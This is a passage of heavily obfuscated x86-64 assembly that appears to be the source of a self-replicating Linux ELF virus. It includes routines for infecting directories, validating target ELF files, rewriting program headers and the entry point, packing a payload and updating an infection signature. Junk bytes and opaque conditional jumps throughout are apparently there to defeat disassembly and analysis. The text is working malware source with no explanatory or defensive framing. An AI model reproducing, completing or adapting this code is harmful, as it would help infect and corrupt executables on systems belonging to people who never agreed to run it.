..@PH5pSfP20kuV:
    mov         QWORD [r2+p_h.p_filesz], r4
    jmp         $+4
db 0x37, 0x22
    js          ..@KVkFK2oqqzqe
    jns         ..@KVkFK2oqqzqe
Strcpy:
    jmp         ..@iXQBX8UWUztC
..@eioc5JZagh9G:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jmp         $+3
db 0x7d
    jmp         $+4
db 0xa2, 0x62
    je          ..@BrBQ3RXtDnv9
    jne         ..@BrBQ3RXtDnv9
..@PGjRZzdoSBaZ:
    mov         r4, m7
    js          ..@cNLtUcbHurIb
    jns         ..@cNLtUcbHurIb
..@o2VjZcbkKRa6:
    jmp         ..@EHSPv4udHMjw
    je          ..@tuT6V4n95KoC
    jne         ..@tuT6V4n95KoC
..@vAw21EJ5VCHJ:
    call        IsELFComplete
    test        al, al
    jnz         ..@uVVpSXTwoi4l
    jmp         $+5
db 0x75, 0xa7, 0x73
    js          ..@wAmFVImTESAQ
    jns         ..@wAmFVImTESAQ
..@r0Chj3C1cm3x:
    xchg        rdi, rdi
    jmp         $+5
db 0xe2, 0xfc, 0x42
    jmp         $+3
db 0x68
    jmp         ..@aIdH13aZQQEg
..@wdlQEmBPYHUf:
    xor         rdi, rdi
    xor         rcx, rcx
    jmp         $+4
db 0xd8, 0xc8
    jl          ..@zA7xggA5T15n
    jge         ..@zA7xggA5T15n
..@FECXfNEUOcBr:
    ret
    jmp         $+4
db 0xed, 0xcd
    jmp         $+4
db 0x3e, 0x2f
    jmp         $+3
db 0x45
..@bWaHnnSfadHL:
    and         r4, 10b
    OFILE       QWORD [r2], r4
    cmp         eax, 0x3
    jmp         ..@EjmArSyMANnG
..@phxuYiWB0aIS:
    mov         rdx, rdx
    jmp         ..@QNyD9MiLciud
..@K3f4u8Pz7483:
    push        rsi
    jmp         $+3
db 0xed
    jb          ..@xIEp7cFxlpZX
    jae         ..@xIEp7cFxlpZX
..@retDJR0yTSHl:
    mov         rsp, rsp
    jmp         $+4
db 0xb8, 0x66
    jmp         ..@UaLRnPFd38oM
..@bb0wweSr9FFO:
    push        r4
    jmp         $+4
db 0x47, 0xbc
    jmp         ..@tMrDXT7xPnO2
..@QJ8gVt8xx79L:
    xchg        rsi, rsi
    cmp         rax, 0x00
    jmp         $+5
db 0x34, 0xe7, 0x85
    jmp         ..@RUQEeT8X7Net
..@ccsPLFgSVuER:
    jge         ..@n6a3mHodPjkq
    jl          ..@e1rbEr7V0d5Z
    jge         ..@e1rbEr7V0d5Z
..@NabHQU1caRLx:
    add         r2, 1
    call        InfectDirectory
    jmp         ..@zHh3SfBY21Uy
    je          ..@Hw0zLsZpDDAh
    jne         ..@Hw0zLsZpDDAh
..@t8qzGqWQ6n48:
    push        rcx
    jmp         $+3
db 0x0c
    jl          ..@tihPXq6fotl3
    jge         ..@tihPXq6fotl3
..@x678uq32skNY:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jl          ..@E3rHbkDWrKej
    jge         ..@E3rHbkDWrKej
..@Mdd6TWDykjUf:
    xor         rdx, rdx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    js          ..@pHXb6vZSWCYz
    jns         ..@pHXb6vZSWCYz
..@hcDALAwtCx2I:
    pop         r5
    pop         r4
    ret
    jmp         $+3
db 0x8e
    jmp         $+3
db 0xf1
    jmp         $+4
db 0xce, 0x14
    jb          UnmapFile
    jae         UnmapFile
..@0oWhZOwBF8um:
    push        rdi
    jmp         $+5
db 0x57, 0xdd, 0x5b
    je          ..@y8efAumHZRb1
    jne         ..@y8efAumHZRb1
..@yENwsKS1L2on:
    mov         rdi, m7
    mov         ecx, PADDING
    jmp         $+5
db 0xca, 0x63, 0xe8
    jmp         $+3
db 0x32
    je          ..@vsx075w38aZZ
    jne         ..@vsx075w38aZZ
..@zUERxH0fVKdi:
    xor         r3, r3
    jb          ..@UGIg5CuHC334
    jae         ..@UGIg5CuHC334
..@VMGlJvj2hI5g:
    cmp         r1, e_h_size
    jmp         $+5
db 0xe4, 0x50, 0xf8
    jmp         ..@xjGTOxQlh8n1
..@CwcwjfYS0M63:
    mov         rax, (-1)
    jmp         $+4
db 0x28, 0x8a
    js          ..@7AdCCb3OYeKF
    jns         ..@7AdCCb3OYeKF
..@Ai3YPPohvTgR:
    add         r1, 1
    jmp         ..@Jxfee3WUwrjn
..@7v3Uy5vMevMu:
%ifdef X86_32
    mov         esi, r2
%endif
    jmp         ..@5cK3493uVwyg
..@DuuyfirsXxff:
    rep         movsb
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    jb          ..@2AZFM0Fq9K77
    jae         ..@2AZFM0Fq9K77
..@SI3tU9d4iq8e:
    pop         rbx
    pop         rax
    je          ..@crm3PNpt2VQT
    jne         ..@crm3PNpt2VQT
..@e1rbEr7V0d5Z:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         ..@H0XbzeTcHL1a
..@kEK0EBccCruF:
    mov         r1, rax
    xor         r2, r2
    jmp         $+5
db 0xa2, 0x3a, 0x1a
    jb          ..@zUERxH0fVKdi
    jae         ..@zUERxH0fVKdi
..@ev4GZjbJjCvf:
    mov         r3, r2
    mov         r2, QWORD [r5+file.filesize]
    mov         r4, 0x1
    je          ..@vD94e0f8tnYa
    jne         ..@vD94e0f8tnYa
..@aOkcZ3bOqDTw:
    jmp         ..@9IEowmpQxE0Y
    jmp         $+3
db 0x3d
    jl          ..@n6a3mHodPjkq
    jge         ..@n6a3mHodPjkq
..@XFy3ZUa5I3hG:
    xchg        rsp, rsp
    jmp         ..@kmWAgKRFJ2jW
..@PFp7EyEgYX7J:
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         ..@xKw0SjL0Wd3l
..@LFzp3sdForQ0:
    jne         ..@Twt8qn8J53By
    jb          ..@Mdd6TWDykjUf
    jae         ..@Mdd6TWDykjUf
..@BiRAnlZn14dK:
    mov         r2, QWORD [r1+file.filesize]
    jb          ..@CcNNNSkSt9xJ
    jae         ..@CcNNNSkSt9xJ
..@AfQi6lgMgeJz:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    js          ..@Vtoi4yOipdrq
    jns         ..@Vtoi4yOipdrq
..@JeTSW03GtXQW:
    mov         rsp, rsp
    jl          ..@8ZMwGXI4tUqA
    jge         ..@8ZMwGXI4tUqA
..@UfiZS9F8fT0e:
    push        rax
    xchg        rdx, rdx
    push        rbx
    jmp         $+5
db 0x72, 0xe1, 0xaa
    jmp         ..@SI3tU9d4iq8e
..@uVVpSXTwoi4l:
    xor         rax, rax
    jmp         ..@pZAPA9c3c5s2
..@l0Oh1JI5dvFa:
    mov         r2, original_virus_len-non_packed_len
    jmp         $+5
db 0xef, 0x13, 0x58
    jl          ..@CBiwPVeIubrc
    jge         ..@CBiwPVeIubrc
..@kOjRuKH1BJ8x:
    ret
    jmp         InfectDirectory
..@GqXXYh9p2LH7:
    push        rbx
    jmp         $+3
db 0x6c
    jmp         ..@TFNDb9uFfLAH
..@4GuRo2yPElD6:
    add         r1, signature_len
    jmp         $+4
db 0x4a, 0x9f
    jmp         ..@vJTjw3fvRCrn
..@hL0x2lZGGaD9:
    mov         r2, m8
    mov         r3, original_virus_len-non_packed_len
    call        MemMove
    jmp         $+4
db 0x2d, 0x46
    js          ..@v2nqTifjBtPi
    jns         ..@v2nqTifjBtPi
..@dH36Us7WnmOX:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    mov         rsi, rsi
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    je          ..@BH2b3xPmYUab
    jne         ..@BH2b3xPmYUab
..@RJECy1WoovWJ:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         ..@RBGNSQwzhdX3
..@t1DvdJLGxpU2:
    pop         rcx
    jmp         $+4
db 0x3f, 0x0d
    je          ..@ZKFUljZtYO6I
    jne         ..@ZKFUljZtYO6I
..@ZKFUljZtYO6I:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    mov         rsi, rsi
    jl          ..@axr1DQ86RLz2
    jge         ..@axr1DQ86RLz2
..@qKgWyfNIw0lh:
    pop         rdx
    js          ..@lyk71R7GqaXi
    jns         ..@lyk71R7GqaXi
..@9feKRmxxLPxh:
    jmp         ..@NpNNNmu2UWzz
    jmp         $+5
db 0x08, 0xad, 0x32
    jmp         ..@0oWhZOwBF8um
..@bfQohZFfeivE:
    test        rax, rax
    jmp         ..@1qMJ6ucL4M3f
..@pu5llpXs0eqV:
    jmp         Strcpy
    je          ..@FECXfNEUOcBr
    jne         ..@FECXfNEUOcBr
..@IUid3z6RFuLp:
    mov         rsi, rsi
    jmp         ..@Q4BM2ArC3GNA
..@kgsqAJJdALeq:
    jne         ..@8fl0P9Y6duTk
    jmp         $+5
db 0x83, 0x95, 0xf3
    jl          ..@q4xuyKJRXsn7
    jge         ..@q4xuyKJRXsn7
..@LxiG6Ed63D5I:
    push        rbx
    pop         rbx
    xor         r4, r4
    jmp         ..@saiKv9DLLWNY
..@0E9EOBhPhJ9Q:
    mov         eax, 1
    jmp         $+4
db 0x4d, 0xe9
    js          ..@yMWPkVlihvu5
    jns         ..@yMWPkVlihvu5
..@X6t2aszx7kfX:
    je          ..@DXwWwrBudibD
    mov         rdi, rdi
    push        r1
    jmp         $+4
db 0xea, 0x04
    jb          ..@IroSS4NZDo8d
    jae         ..@IroSS4NZDo8d
..@eUyy9HbLeghL:
    test        al, al
    je          ..@j2bevlHU9Trc
    jne         ..@j2bevlHU9Trc
..@qOBmJJrGWTYx:
    push        r2
    push        r3
    js          ..@JeTSW03GtXQW
    jns         ..@JeTSW03GtXQW
..@lyk71R7GqaXi:
    cmp         eax, 0x0
    jmp         $+4
db 0x47, 0x2e
    jmp         $+3
db 0x43
    jmp         ..@oJ4YAeIywyUs
..@Zo9etHfoZrce:
    call        DYNPIEValidation
    jmp         $+3
db 0x96
    jmp         $+3
db 0x23
    jmp         $+4
db 0xbf, 0x9b
    jb          ..@w4mDUBN10Wer
    jae         ..@w4mDUBN10Wer
..@bPUXO4FcPWDS:
    push        rbx
    jmp         $+3
db 0x28
    jb          ..@aetvRD7JSheG
    jae         ..@aetvRD7JSheG
..@i8pLqEVG8ofb:
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    jne         ..@7H4hQvxeVdOX
    jmp         $+5
db 0x02, 0x09, 0x59
    js          ..@PWVLJZQTMpFs
    jns         ..@PWVLJZQTMpFs
..@dtRlskH09gLC:
    rep         movsb
    jmp         $+4
db 0xb1, 0x09
    jl          ..@46t7aRbyd1aN
    jge         ..@46t7aRbyd1aN
..@jkIj22jVxgY5:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.index-_signature.start
    jmp         $+5
db 0x7e, 0x30, 0xc8
    jmp         $+5
db 0x48, 0x85, 0x13
    je          ..@2qUwmQCoJzVW
    jne         ..@2qUwmQCoJzVW
..@u2fp1XB79TJO:
    xor         r2, r2
    mov         r2w, WORD [r5+e_h.e_shnum]
    xor         rax, rax
    js          ..@CE6gQux7q2gB
    jns         ..@CE6gQux7q2gB
..@VdsMOOwHMslf:
    syscall
    jmp         $+3
db 0x07
    js          ..@A0cKHq4He51e
    jns         ..@A0cKHq4He51e
..@ymjfR4YnjzhQ:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         ..@jKyfDNTCrF87
..@ErnYEvlExn4E:
    xor         rax, rax
    jmp         $+5
db 0xf6, 0x65, 0xe9
    jmp         ..@ec5htoyiENrE
..@C2mNyI73wisp:
    xchg        rax, rax
    js          ..@Km8IpqMfKwnl
    jns         ..@Km8IpqMfKwnl
..@m4j2APO4P1sQ:
    mul         r2
    xchg        rax, rax
    jmp         $+3
db 0x6a
    jmp         ..@Y3VfVm3f17LP
..@xKw0SjL0Wd3l:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jb          ..@Bn767kiUyVbC
    jae         ..@Bn767kiUyVbC
..@YkGGU4Qu26I2:
    add         r4, rax
    jl          ..@EgdcNW6dwY9s
    jge         ..@EgdcNW6dwY9s
..@2sJSZYYjZJ7V:
    jmp         ..@94jNiw9qieam
    jmp         $+3
db 0xc5
    jmp         ..@bCYVuOKD8RVx
..@sVZ8R87XSjF6:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    sub         r1, r4
    call        MemMove
    jmp         $+3
db 0x3a
    jmp         $+3
db 0x54
    jmp         $+4
db 0xf7, 0xa6
    jmp         $+4
db 0x14, 0xc2
    js          ..@C2mNyI73wisp
    jns         ..@C2mNyI73wisp
..@98jzXQQwVzwj:
    syscall
    test        eax, eax
    push        rdx
    jmp         ..@qrNEaB97vm3O
..@VkG6pY9mrPjr:
    push        r5
    jmp         $+5
db 0xab, 0xe0, 0x20
    jl          ..@DTk78nNJv0rO
    jge         ..@DTk78nNJv0rO
..@hmo9xifFRUwq:
    xchg        rax, rax
    jl          ..@yI3C8bCN2CLH
    jge         ..@yI3C8bCN2CLH
..@GRSHuGlOmtZk:
    mov         eax, SYS_LSEEK
    syscall
    push        rdx
    jmp         $+4
db 0x8c, 0xa6
    jmp         ..@qKgWyfNIw0lh
..@bFTDzU9Zmmrn:
    push        rax
    jmp         ..@nPLBpZrZ8Qcg
..@ZTdr77oJRhhf:
    pop         r1
    jl          ..@rkWMlRs2jn09
    jge         ..@rkWMlRs2jn09
..@9mOQYwCjjcQ0:
    pop         rdx
    jmp         $+5
db 0x7d, 0xb8, 0xf7
    jmp         $+4
db 0xb3, 0x29
    jmp         ..@AKgIL2cmiMaQ
..@rkWMlRs2jn09:
    ret
    jb          DYNPIEValidation
    jae         DYNPIEValidation
..@Dv77GuySem57:
    jne         ..@Hw0zLsZpDDAh
    jmp         $+3
db 0x6a
    jmp         $+4
db 0xa1, 0xde
    jb          ..@wNDbB8XiTneK
    jae         ..@wNDbB8XiTneK
..@Iog5upBVgaGZ:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    je          ..@wvVXw4uCsYIl
    jne         ..@wvVXw4uCsYIl
..@loblwjpvfPzf:
    syscall
    jmp         $+3
db 0xa0
    jmp         $+5
db 0x0c, 0x55, 0x10
    jb          ..@CBt5nX8sgwhQ
    jae         ..@CBt5nX8sgwhQ
..@Jxfee3WUwrjn:
    mov         rbx, rbx
    mov         rbp, rbp
    jl          ..@6B7yWbQhKRDj
    jge         ..@6B7yWbQhKRDj
..@AnQmVKPBZmNJ:
    add         r1, rax
    jmp         ..@i8pLqEVG8ofb
..@XeWD7NpdwxUA:
    mov         QWORD [rsp+_NBF_OFF.file], r1
    mov         r1, [rsp+_NBF_OFF.file]
    mov         r2, signature_len
    jmp         $+5
db 0x2c, 0xbe, 0x8d
    jmp         $+4
db 0x2b, 0x6d
    jl          ..@yl22HwyrPaAX
    jge         ..@yl22HwyrPaAX
GetNewProgramVaddr:
    jmp         ..@f9mVeu7XCVmS
..@EjmArSyMANnG:
    jl          ..@CwcwjfYS0M63
    jmp         ..@hVAMXsV8M3P7
..@SEE1c3u1jdHM:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jb          ..@e80yVYXvklxL
    jae         ..@e80yVYXvklxL
..@ffirTugvGaqb:
    pop         rcx
    jmp         $+5
db 0xdb, 0xbc, 0x66
    js          ..@ZZusIXiNA1JW
    jns         ..@ZZusIXiNA1JW
..@aq2pbgIR1yhj:
    pop         rdx
    jmp         $+3
db 0x49
    jmp         $+4
db 0xe7, 0x27
    jmp         $+4
db 0x3c, 0x4f
    jmp         $+5
db 0x7e, 0x1b, 0x61
    js          ..@9VgQSZvIuChs
    jns         ..@9VgQSZvIuChs
..@TltAibaPtY44:
%ifdef X86_64
    mov         r10d, 0x01
    mov         r8d, DWORD [r8+file.filefd]
    push        rbx
%endif
    jmp         ..@wWGllNrzMMCv
..@jIH9m0dp64yr:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+3
db 0x31
    je          ..@CwcwjfYS0M63
    jne         ..@CwcwjfYS0M63
..@jKyfDNTCrF87:
%ifdef X86_64
    mov         rsi, QWORD [r8+file.filesize]
%endif
    jmp         $+3
db 0x7a
    js          ..@EzVFbwiZgRD6
    jns         ..@EzVFbwiZgRD6
..@mrmSVw94A3TT:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+4
db 0x6e, 0x5f
    jb          ..@GwkkxdFUGiyo
    jae         ..@GwkkxdFUGiyo
..@iRRMDGCNa6t9:
    mov         rax, rdi
    ret
    jmp         $+4
db 0xd4, 0x6d
    jmp         IsNum
..@yMWPkVlihvu5:
    ret
    jb          Strcpy
    jae         Strcpy
..@6uPrtpYBDqQK:
    mov         BYTE [r1], 0x00
    jmp         $+4
db 0xc0, 0x53
    je          ..@StFyg7lXPgdc
    jne         ..@StFyg7lXPgdc
..@5KdCzJw9jFni:
    mov         r3, r1
    jmp         $+3
db 0xa8
    jmp         ..@tQxbkd97QmZm
..@FFXKaBEpww85:
    push        rcx
    pop         rcx
    jmp         ..@xEcKRp7WBsZd
..@tIkW0Jh4q3NS:
    mov         rax, SYS_FORK
    jb          ..@HT2fAHCkF0te
    jae         ..@HT2fAHCkF0te
..@Hw0zLsZpDDAh:
    cmp         BYTE [r5], DT_REG
    jne         ..@zHh3SfBY21Uy
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jl          ..@AfQi6lgMgeJz
    jge         ..@AfQi6lgMgeJz
..@xXnPFd7SMBev:
    ret
    jmp         $+5
db 0x79, 0xa4, 0xef
    jmp         $+5
db 0xb0, 0x6c, 0x0b
    jmp         $+3
db 0x31
    jmp         UpdateSignature
..@5QVKqfkIgiVk:
    mov         r1, QWORD [r5+file.filename]
    js          ..@LgouUSxXqQrg
    jns         ..@LgouUSxXqQrg
..@94jNiw9qieam:
    call        DestroyPayload
    jl          ..@x678uq32skNY
    jge         ..@x678uq32skNY
..@71hAvtCDspQQ:
    jmp         ..@uVVpSXTwoi4l
    jb          ..@s9ccoAjMeoOB
    jae         ..@s9ccoAjMeoOB
..@FZgk4H2QtdAA:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    js          ..@7H4hQvxeVdOX
    jns         ..@7H4hQvxeVdOX
..@q8MwgJWFxw4e:
    je          ..@uVVpSXTwoi4l
    je          ..@WHHAzANy0hH6
    jne         ..@WHHAzANy0hH6
..@2AZFM0Fq9K77:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    mov         ecx, WINDOW_LENGTH*2
    jmp         $+3
db 0xb9
    je          ..@tqvRxALA2E6h
    jne         ..@tqvRxALA2E6h
..@aIdH13aZQQEg:
    rep         nop
    mov         rax, rsp
    jmp         $+4
db 0xe2, 0x99
    js          ..@mbZ4YlONkY5T
    jns         ..@mbZ4YlONkY5T
..@nr1VDbvZYv62:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    push        rsi
    jmp         $+3
db 0x1f
    jmp         ..@2BewgiO3waBn
..@H1gSt5867aLz:
    mov         r4, 0
    jl          ..@H0ZKf4O49hgl
    jge         ..@H0ZKf4O49hgl
..@Q4IeeVnYVYOz:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    jmp         ..@H1gSt5867aLz
..@w5wAOV7NRMUC:
    pop         r5
    jmp         ..@R2sbdsHWd7I2
AddSizeMappedFile:
    jmp         ..@qCoXzAxXPp7k
..@irnnu9X5r9nO:
    mov         BYTE [r1], '/'
    add         r1, 1
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x58, 0x34, 0x0e
    jl          ..@68T2RC2dvqtk
    jge         ..@68T2RC2dvqtk
..@0GXe3ajxvwY5:
    xchg        rbx, rbx
    jmp         $+5
db 0x15, 0x27, 0x19
    jl          ..@25nVqPoridCj
    jge         ..@25nVqPoridCj
..@QU4B10syLazp:
    xor         rax, rax
    jmp         $+3
db 0xca
    jmp         $+5
db 0xed, 0x8a, 0xfa
    jmp         $+3
db 0xcc
    jmp         ..@mZzdLInJYoRj
..@xJZC890AAJ2B:
%ifdef X86_32
    push        rcx
%endif
    jmp         $+5
db 0x28, 0xe3, 0xfe
    jmp         $+3
db 0xdc
    js          ..@pdzQ93yTHlrf
    jns         ..@pdzQ93yTHlrf
..@GyVl32kbegW4:
    GGLOBAL     _signature.start
    jmp         ..@0R1Qd6CRFoSS
..@xEcKRp7WBsZd:
    sub         r4, QWORD [r1+e_h.e_entry]
    jmp         $+3
db 0x00
    je          ..@mvWAfbBsogAO
    jne         ..@mvWAfbBsogAO
..@XOj9K8gKPQCF:
    xor         rdx, rdx
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         ..@PmRocgDvVvDU
..@cyTowqbaOIhs:
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+5
db 0xb3, 0xbb, 0x20
    jb          ..@BGneDyZVIRQU
    jae         ..@BGneDyZVIRQU
..@Uu8Sj7RNbNLl:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0x85, 0xe4
    jb          ..@ev4GZjbJjCvf
    jae         ..@ev4GZjbJjCvf
..@GPRdf6VoKISY:
    xor         rax, rax
    jb          ..@Fz3XORzkjYp9
    jae         ..@Fz3XORzkjYp9
..@9jzuWAtzFXLE:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    jb          ..@39HoCT5vqkh5
    jae         ..@39HoCT5vqkh5
..@I0hmBwwfZJPD:
    mov         eax, ebx
    and         eax, edx
    push        rsi
    jmp         ..@Ng6kYSHdVU8F
..@RgjFdZt58iG9:
    mov         QWORD [r1+e_h.e_entry], r3
    jl          ..@EjWxEh8PJMab
    jge         ..@EjWxEh8PJMab
..@4tpgDHwdl29l:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    call        WORDToDWORDASCII
    jmp         $+3
db 0xce
    jb          ..@jkIj22jVxgY5
    jae         ..@jkIj22jVxgY5
..@e80yVYXvklxL:
    mov         r2, r4
    jmp         $+3
db 0x4f
    jmp         $+4
db 0xc6, 0xfc
    jmp         $+3
db 0x39
    jmp         ..@prMWVdrimG1d
..@mvWAfbBsogAO:
    cmp         r4, 0x00
    jle         ..@x678uq32skNY
    push        r1
    jmp         $+3
db 0xe6
    jl          ..@qOBmJJrGWTYx
    jge         ..@qOBmJJrGWTYx
..@saiKv9DLLWNY:
    mov         rax, r4
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3
    jmp         ..@G1VJCaZ39HL2
..@bDoosC8Pqeav:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    jl          ..@zQZvL35Jm7K3
    jge         ..@zQZvL35Jm7K3
..@AKgIL2cmiMaQ:
    jnz         ..@DYp4u77rHkIN
    jmp         $+5
db 0xcb, 0x7b, 0xc0
    jmp         ..@Ow2WU97duV4S
..@IXh1YpJELhQs:
    jz          ..@FECXfNEUOcBr
    jmp         ..@puMHtFSLuNUR
..@2LkxG3kESMWZ:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+4
db 0x42, 0xfa
    jmp         $+5
db 0xc5, 0x44, 0xdf
    jmp         $+3
db 0xc8
    js          ..@I77vCwSqZfRa
    jns         ..@I77vCwSqZfRa
..@kSpDms1KQjdm:
    add         r4, 1
    jmp         $+5
db 0x49, 0x77, 0xc6
    je          ..@NGIHe7zYbrQs
    jne         ..@NGIHe7zYbrQs
..@vD94e0f8tnYa:
    xor         rax, rax
    jmp         $+4
db 0x5f, 0x3d
    jb          ..@uxyWLHFxCJEm
    jae         ..@uxyWLHFxCJEm
..@WBPab5C0MPAI:
    xor         rcx, rcx
    js          ..@Qg7CZdVzojMH
    jns         ..@Qg7CZdVzojMH
..@NpNNNmu2UWzz:
    mov         r1, r5
    jmp         $+4
db 0xa6, 0x33
    jb          ..@78QaSjQoWnBt
    jae         ..@78QaSjQoWnBt
..@ZXN5ZKKUAVlP:
    pop         rsi
    jb          ..@PT62GvJpfVXu
    jae         ..@PT62GvJpfVXu
..@8fl0P9Y6duTk:
    push        rdi
    js          ..@KvXBD9vLoeJD
    jns         ..@KvXBD9vLoeJD
..@1F6xAH2rHeUz:
    mov         r3, rax
    jmp         $+4
db 0xd7, 0x2c
    jl          ..@EMtNEA5tX3vY
    jge         ..@EMtNEA5tX3vY
..@zOkjhDLcQyD3:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         $+3
db 0xd1
    jb          ..@7QLR3TB0pwjW
    jae         ..@7QLR3TB0pwjW
..@KVkFK2oqqzqe:
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         $+4
db 0x5b, 0x09
    jb          ..@SZrB0VSNlXDB
    jae         ..@SZrB0VSNlXDB
CreatePayload:
    jmp         ..@zbaiuqvCRsst
..@gXyycPkL22iD:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jb          ..@Y1mcwQ4av2WX
    jae         ..@Y1mcwQ4av2WX
..@n6a3mHodPjkq:
    add         rbx, 1
    mov         rcx, rcx
    jl          ..@gbPUmsQZyzai
    jge         ..@gbPUmsQZyzai
..@yLIx0qlvth3I:
    xchg        rsp, rsp
    je          IsELFComplete
    jne         IsELFComplete
..@9VgQSZvIuChs:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rax, rax
    jmp         $+4
db 0x45, 0x76
    jmp         $+4
db 0xfa, 0x8e
    jb          ..@gvbgtHP1m5RF
    jae         ..@gvbgtHP1m5RF
..@zQZvL35Jm7K3:
    mov         r2, r1
    rep         nop
    je          ..@4GuRo2yPElD6
    jne         ..@4GuRo2yPElD6
..@5Mm2TuOtOm72:
    add         r3, r5
    xchg        rsi, rsi
    mov         r4, r3
    jmp         $+5
db 0x88, 0x05, 0xf5
    jmp         ..@FFXKaBEpww85
..@lvKpzj7MBJ9V:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    jmp         ..@AaPWyLmjE5ZB
..@thJYo6aakfpP:
    jmp         ..@uVVpSXTwoi4l
    jl          ..@O5YSYSpv3Cwx
    jge         ..@O5YSYSpv3Cwx
..@it9fSZeHJKT0:
    rep         movsb
    cld
    jmp         ..@evhvF8uVil70
    jl          ..@IbrcKzXmUH2k
    jge         ..@IbrcKzXmUH2k
..@NDoVGHwVEeF9:
    xchg        rcx, rcx
    jl          ..@ITbYBXKq3ibu
    jge         ..@ITbYBXKq3ibu
..@CcNNNSkSt9xJ:
    cmp         rax, r2
    jmp         $+3
db 0xe6
    jmp         $+3
db 0x71
    jl          ..@PrKiGzUPftaS
    jge         ..@PrKiGzUPftaS
..@SZrB0VSNlXDB:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    xchg        rsp, rsp
    jmp         ..@AcEBK8gcbOrt
..@fKgGuN5bxOxH:
    mov         r5, r2
    jmp         $+3
db 0x84
    jmp         ..@nMKrUYnRgHFD
..@HIdSBFkhSgk1:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    shl         ebx, LENGTH_BITS
    jl          ..@AL4SMjg6WBEA
    jge         ..@AL4SMjg6WBEA
..@wAmFVImTESAQ:
    mov         rax, 1
    push        rdx
    jmp         ..@S30C6w8z62z5
..@Wb8sE2Hu4Ywv:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    jmp         $+5
db 0xb6, 0x51, 0x34
    jmp         $+3
db 0xcf
    js          ..@ZSeJ823HDgPM
    jns         ..@ZSeJ823HDgPM
..@Ng6kYSHdVU8F:
    pop         rsi
    jmp         ..@Qc6hBQKTP2FY
..@BN7Oj3MGxvAd:
    mov         r2, rax
    mov         rax, SYS_FTRUNCATE
    jmp         $+3
db 0xc8
    jmp         $+3
db 0x8c
    jmp         ..@bQBMV33Wxr01
..@QvLQTbrtyp45:
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         ..@AnQmVKPBZmNJ
..@49qrjt2V3XrX:
    mov         rax, SYS_FORK
    jmp         $+5
db 0xd4, 0xf7, 0x7b
    jmp         ..@loblwjpvfPzf
..@7R1rCKZIBYVF:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    je          ..@Zy8eDcuGSisj
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         ..@pfAtZo035FTI
..@GMJd33RRNoMC:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jl          ..@5m2CbC05ti8y
    mov         rax, 1
    jl          ..@uFcLqbMUAlzw
    jge         ..@uFcLqbMUAlzw
..@Ob22G9IQyRq1:
%ifdef X86_32
    push        rbx
    pop         rbx
    mov         rsp, rsp
%endif
    jb          ..@sOv3BoCxqRdd
    jae         ..@sOv3BoCxqRdd
..@ZSeJ823HDgPM:
    xchg        rcx, rcx
    jmp         $+3
db 0x73
    js          ..@XeWD7NpdwxUA
    jns         ..@XeWD7NpdwxUA
..@IbrcKzXmUH2k:
    rep movsb 
    jb          ..@evhvF8uVil70
    jae         ..@evhvF8uVil70
..@FQSWxfb0g8eU:
    pop         rbx
    jmp         $+4
db 0x44, 0x15
    jl          ..@YkGGU4Qu26I2
    jge         ..@YkGGU4Qu26I2
..@HMsvByt7j9Su:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
